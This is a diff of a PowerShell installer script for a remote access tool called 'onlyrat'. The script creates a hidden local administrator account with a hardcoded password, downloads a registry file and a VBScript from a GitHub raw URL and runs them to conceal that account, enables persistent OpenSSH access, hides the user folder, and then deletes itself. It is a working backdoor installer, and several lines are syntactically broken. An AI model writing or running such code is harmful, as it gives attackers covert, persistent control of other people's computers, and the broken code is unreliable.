@@ -6,50 +6,64 @@ function random_text {
   }
   
 #creates local admin 
-function create_account {
+function create_$NewLocalAdmin {
     [CmdletBinding()]
     param (
-        [string] $uname, 
-        [securestring] $pword
+        [string] $NewLocalAdmin, 
+        [securestring] $Password
     )
     begin {
     }
     process {
-    New-LocalUser "$uname" -pword $pword -FullName "$uname" -Description "Temporary local admin" Write-Verbose "$uname local user crated" Add-LocalGroupMember  -Group "Administrators" -Member "$uname"
+    New-LocalUser "$NewLocalAdmin" -Password $Password -FullName "$uname" -Description "Temporary local admin" 
+    Write-Verbose "$NewLocalAdmin local user crated" 
+    Add-LocalGroupMember  -Group "Administrators" -Member "$NewLocalAdmin"
+    Write-Verbose "$NewLocalAdmin added to local administrator group" 
     }
     end {
     }
 }
-# create admin user
-$uname = random_text
-$pword = (ConvertTo-SecureString "onlyrat"--AsPlainText -Force) 
-create_account -uname $uname -pword $pword
+$NewLocalAdmin = "onlyrat"
+$Password = (ConvertTo-SecureString "onlyrat"--AsPlainText -Force) 
+create-NewLocalAdmin -NewLocalAdmin $NewLocalAdmin -Password $Password
 
-# registry to hide local admin
-$reg_file = random_text
-Invoke-WebRequest -Uri raw.githubusercontent.com/WayneTheGod/test2/main/onlyrat/files/admin.reg -OutFile "$reg_file.reg"
-
-# visual basic script to register the registry 
-$vbs_file = random_text
-Invoke-WebRequest -Uri raw.githubusercontent.com/WayneTheGod/test2/main/onlyrat/files/confirm.vbs -OutFile "$vbs_file.vbs".ps1
-
-#install registry 
-./"$reg_file.reg";"$vbs_file.vbs"
-
-## variables 
+# variables 
 $wd = random_text
 $path = "$env:temp/$wd"
 $initial_dir = Get-Location
+$ip = (Get-NetIPAddress -AddressFamily IPV4 -InterfaceAlias Ethernet)
+.IPAddress
 
-#enabling persistent ssh
-Add-WindowsCapability -Online -Name OpenSSH.Server~~~~.0.1.0 Start-Service sshd Set-Service -Name sshd -StartupType 'Automatic' Get-NetFirewallRule -Name *ssh*
+# create admin user
+$uname = "onlyrat"
+$pword = (ConvertTo-SecureString "onlyrat"--AsPlainText -Force) 
+create_account -uname $uname -pword $pword
 
 
 # goto temp , make working directory 
 mkdir $path 
 cd $path
 
-#self delete
-# cd $initial_dir
-# del installer.ps1
+# registry to hide local admin
+Invoke-WebRequest -Uri raw.githubusercontent.com/WayneTheGod/test2/main/onlyrat/files/wrev.reg -OutFile "$wrev.reg"
+
+# visual basic script to register the registry 
+Invoke-WebRequest -Uri raw.githubusercontent.com/WayneTheGod/test2/main/onlyrat/files/calty.vbs -OutFile "$calty.vbs"
+
+#enabling persistent ssh
+Add-WindowsCapability -Online -Name OpenSSH.Server~~~~.0.1.0 
+Start-Service sshd 
+Set-Service -Name sshd -StartupType 'Automatic'
+
+#install registry 
+./wrev.reg; ./calty
+
+#hide user
+cd C:\Users
+attrib +h +s +r onlyrat
+
+
+# self delete
+cd $initial_dir
+del installer.ps1
 
